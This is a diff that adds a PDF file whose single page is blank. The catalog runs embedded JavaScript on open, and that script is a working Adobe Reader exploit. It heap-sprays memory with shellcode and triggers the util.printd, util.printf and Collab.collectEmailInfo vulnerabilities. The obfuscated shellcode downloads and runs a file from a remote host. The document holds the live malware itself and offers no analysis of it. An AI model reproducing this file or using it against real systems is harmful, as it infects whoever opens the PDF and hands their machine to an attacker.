@@ -1,0 +1,195 @@
+%PDF-1.3%����
+1 0 obj
+<</OpenAction <</JS (this.pdfff\(\))
+/S /JavaScript
+>>
+/Threads 2 0 R
+/Outlines 3 0 R
+/Pages 4 0 R
+/ViewerPreferences <</PageDirection /L2R
+>>
+/PageLayout /SinglePage
+/AcroForm 5 0 R
+/Dests 6 0 R
+/Names 7 0 R
+/Type /Catalog
+>>
+endobj
+2 0 obj
+[]
+endobj
+3 0 obj
+<</Count 0
+/Type /Outlines
+>>
+endobj
+4 0 obj
+<</Resources 8 0 R
+/Kids [9 0 R]
+/Count 1
+/Type /Pages
+>>
+endobj
+5 0 obj
+<</Fields []
+>>
+endobj
+6 0 obj
+<<>>
+endobj
+7 0 obj
+<</JavaScript 10 0 R
+>>
+endobj
+8 0 obj
+<</ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
+>>
+endobj
+9 0 obj
+<</Rotate 0
+/Parent 4 0 R
+/Resources 8 0 R
+/TrimBox [0 0 595.28000 841.89000]
+/MediaBox [0 0 595.28000 841.89000]
+/pdftk_PageNum 1
+/Contents 11 0 R
+/Type /Page
+>>
+endobj
+10 0 obj
+<</Names [(New_Script) 12 0 R]
+>>
+endobj
+11 0 obj
+<</Length 31
+>>
+stream
+0 0 595.28000 841.89000 re W n
+
+endstream
+endobj
+12 0 obj
+<</JS 13 0 R
+/S /JavaScript
+>>
+endobj
+13 0 obj
+<</Length 7434
+>>
+stream
+function pdfff() {
+  function gln(num, content){ var z = ''; for (var i = 0; i < num; i++){ z += content.toString(); } return z; }
+  function fix_it(yarsp, len){
+    while (yarsp.length * 2 < len){
+      yarsp += yarsp;
+    }
+    yarsp = yarsp.substring(0, len/2);
+    return yarsp;
+  }
+  
+  function util_printd()
+  {
+    var shellcode = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2f3a%u612f%u7272%u6d6d%u6e61%u2e69%u6f63%u2f6d%u7562%u2f31%u656e%u7377%u702e%u7068%u643f%u3d64%u3225%u3335%u4141%u4131%u3225%u3735%u5f42%u3373%u7378%u7274%u7933%u426b%u3225%u3235%u4134%u3665%u4275%u7065%u3225%u3235%u2539%u3532%u3132%u4235%u5156%u2545%u3532%u4632%u3045%u4635%u3858%u2558%u3532%u3232%u5672%u3225%u3235%u7132%u2567%u3532%u4435%u716d%u7542%u5461%u2575%u3532%u3232%u256e%u3532%u4232%u546d%u3225%u3235%u7341%u776d%u3225%u3335%u7741%u6949%u2578%u3532%u3232%u7553%u2552%u3532%u4235%u316c%u3225%u3335%u2542%u3532%u4332%u2536%u3532%u4233%u3225%u3235%u5a32%u3146%u3135%u5555%u3225%u3335%u6244%u256f%u3532%u4132%u5f72%u3225%u3235%u6232%u257a%u3532%u4433%u6c79%u2539%u3532%u3932%u3225%u3335%u7942%u256e%u3532%u3232%u4b37%u5a31%u4433%u4b34%u3244%u7243%u7753%u2556%u3532%u3232%u2536%u3532%u4437%u2578%u3532%u3332%u4241%u3225%u3235%u2542%u3532%u3232%u2556%u3532%u3232%u5348%u4e6f%u5777%u2533%u3532%u3232%u7a6c%u3225%u3235%u2539%u3532%u3232%u6c69");
+    var nx = unescape("%u3f42%u3792"); 
+    var length = 0x10000;
+    while(nx.length <= length) nx += nx; 
+    nx = nx.substring(0,  length - shellcode.length); 
+    var memory = new Array(); 
+    
+    for(var i = 0; i < 0x1000; i++) 
+    {
+      memory[i]= nx + shellcode; 
+    } 
+    
+    try {this.media.newPlayer(null);} catch(e) {} 
+    util.printd("p@000000000000000000000000 : pppp000", new Date());
+  }
+  
+  function util_printf(){
+    var shellcode = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2f3a%u612f%u7272%u6d6d%u6e61%u2e69%u6f63%u2f6d%u7562%u2f31%u656e%u7377%u702e%u7068%u643f%u3d64%u3225%u3335%u4141%u4131%u3225%u3735%u5f42%u3373%u7378%u7274%u3145%u7778%u4149%u3665%u4275%u7065%u2579%u3532%u4333%u3857%u2573%u3532%u3432%u2543%u3532%u4632%u3045%u4635%u3858%u2558%u3532%u3232%u5672%u3225%u3235%u7132%u2567%u3532%u4435%u716d%u7542%u5461%u2575%u3532%u3232%u256e%u3532%u4232%u546d%u3225%u3235%u7341%u776d%u3225%u3335%u7741%u6949%u2578%u3532%u3232%u7553%u2552%u3532%u4235%u316c%u3225%u3335%u2542%u3532%u4332%u2536%u3532%u4233%u3225%u3235%u5a32%u3146%u3135%u5555%u3225%u3335%u6244%u256f%u3532%u4132%u5f72%u3225%u3235%u6232%u257a%u3532%u4433%u6c79%u2539%u3532%u3932%u3225%u3335%u7942%u256e%u3532%u3232%u4b37%u5a31%u4433%u4b34%u3244%u7243%u7753%u2563%u3532%u3232%u2536%u3532%u4437%u3225%u3235%u2534%u3532%u4232%u2547%u3532%u3932%u3225%u3235%u2542%u3532%u3232%u2556%u3532%u3232%u5348%u7479%u4337%u2533%u3532%u3232%u7a6c%u3225%u3235%u2539%u3532%u3232%u6c69");
+    var get_spray = unescape("%u0A0A%u0A0A");
+    var spray = 20;
+    var make_hellcode = spray+shellcode.length;
+    while (get_spray.length < make_hellcode) get_spray += get_spray;
+    var count2 = get_spray.substring(0, make_hellcode);
+    var addr = get_spray.substring(0, get_spray.length - make_hellcode);
+    while (addr.length + make_hellcode < 0x60000) addr=addr+addr+count2;
+    var sc_len = [];
+    for (var overflow = 0; overflow < 1200; overflow++){ sc_len[overflow] = addr + shellcode }
+    var cc = 12 + gln(18, 9) + gln(276, 8);
+    util.printf("%45000f",cc);
+  }
+  
+  function collab_email(){
+    var shellcode = unescape("%u56e8%u0000%u5300%u5655%u8b57%u246c%u8b18%u3c45%u548b%u7805%uea01%u4a8b%u8b18%u205a%ueb01%u32e3%u8b49%u8b34%uee01%uff31%u31fc%uacc0%ue038%u0774%ucfc1%u010d%uebc7%u3bf2%u247c%u7514%u8be1%u245a%ueb01%u8b66%u4b0c%u5a8b%u011c%u8beb%u8b04%ue801%u02eb%uc031%u5e5f%u5b5d%u08c2%u5e00%u306a%u6459%u198b%u5b8b%u8b0c%u1c5b%u1b8b%u5b8b%u5308%u8e68%u0e4e%uffec%u89d6%u53c7%u8e68%u0e4e%uffec%uebd6%u5a50%uff52%u89d0%u52c2%u5352%uaa68%u0dfc%uff7c%u5ad6%u4deb%u5159%uff52%uebd0%u5a72%u5beb%u6a59%u6a00%u5100%u6a52%uff00%u53d0%ua068%uc9d5%uff4d%u5ad6%uff52%u53d0%u9868%u8afe%uff0e%uebd6%u5944%u006a%uff51%u53d0%u7e68%ue2d8%uff73%u6ad6%uff00%ue8d0%uffab%uffff%u7275%u6d6c%u6e6f%u642e%u6c6c%ue800%uffae%uffff%u5255%u444c%u776f%u6c6e%u616f%u5464%u466f%u6c69%u4165%ue800%uffa0%uffff%u2e2e%u745c%ue800%uffb7%uffff%u2e2e%u685c%u7474%u3a70%u2f2f%u7261%u6d72%u616d%u696e%u632e%u6d6f%u622f%u3175%u6e2f%u7765%u2e73%u6870%u3f70%u6464%u253d%u3532%u4133%u3141%u2541%u3532%u4237%u735f%u7833%u7473%u5772%u694c%u3075%u656b%u7536%u6542%u4370%u524a%u7a35%u2d31%u3225%u3235%u4546%u3530%u5846%u5838%u3225%u3235%u7232%u2556%u3532%u3232%u6771%u3225%u3535%u6d44%u4271%u6175%u7554%u3225%u3235%u6e32%u3225%u3235%u6d42%u2554%u3532%u4132%u6d73%u2577%u3532%u4133%u4977%u7869%u3225%u3235%u5332%u5275%u3225%u3535%u6c42%u2531%u3532%u4233%u3225%u3235%u3643%u3225%u3335%u2542%u3532%u3232%u465a%u3531%u5531%u2555%u3532%u4433%u6f62%u3225%u3235%u7241%u255f%u3532%u3232%u7a62%u3225%u3335%u7944%u396c%u3225%u3235%u2539%u3532%u4233%u6e70%u3225%u3235%u3732%u314b%u695a%u4b7a%u774b%u7967%u2567%u3532%u4232%u3225%u3235%u7238%u2539%u3532%u3232%u2536%u3532%u4437%u3225%u3235%u3342%u2537%u3532%u4232%u3225%u3235%u5632%u3225%u3235%u4832%u5853%u5968%u3362%u3225%u3235%u6c32%u257a%u3532%u3932%u3225%u3235%u6932%u006c%u89e8%uffff%u00ff");
+    var mem_array = new Array();
+    var cc = 0x0c0c0c0c;
+    var addr = 0x400000;
+    var sc_len = shellcode.length * 2;
+    var len = addr - (sc_len+0x38);
+    var yarsp = unescape("%u9090%u9090");
+    yarsp = fix_it(yarsp, len);
+    var count2 = (cc - 0x400000)/addr;
+    for (var count = 0; count < count2; count++){
+      mem_array[count] = yarsp + shellcode;
+    }
+    var overflow = unescape("%u0c0c%u0c0c");
+    while (overflow.length < 44952){
+      overflow += overflow;
+    }
+    this.collabStore = Collab.collectEmailInfo({subj: "",msg: overflow});
+  }
+
+  function pdf_start(){
+    /*var version = app.viewerVersion.toString();
+    version = version.replace(/\D/g,'');
+    var varsion_array = new Array(version.charAt(0), version.charAt(1), version.charAt(2));
+    
+    if (varsion_array[0] < 8){
+      collab_email();
+    }
+    else {
+      util_printd();
+    }*/
+    util_printd();
+  }
+  pdf_start();
+}
+endstream
+endobj
+14 0 obj
+<</Creator (Scribus 1.3.3.12)
+/Title <>
+/Producer (Scribus PDF Library 1.3.3.12)
+/Author <>
+/Keywords <>
+/Trapped /False
+/ModDate (2008312053854)
+/CreationDate (2008312053854)
+>>
+endobj
+xref
+0 15
+0000000000 65535 f 
+0000000015 00000 n 
+0000000261 00000 n 
+0000000279 00000 n 
+0000000324 00000 n 
+0000000397 00000 n 
+0000000428 00000 n 
+0000000448 00000 n 
+0000000487 00000 n 
+0000000553 00000 n 
+0000000731 00000 n 
+0000000781 00000 n 
+0000000862 00000 n 
+0000000909 00000 n 
+0000004186 00000 n 
+trailer
+<</Info 14 0 R
+/Root 1 0 R
+/Size 15
+>>
+startxref
+4374
+%%EOF
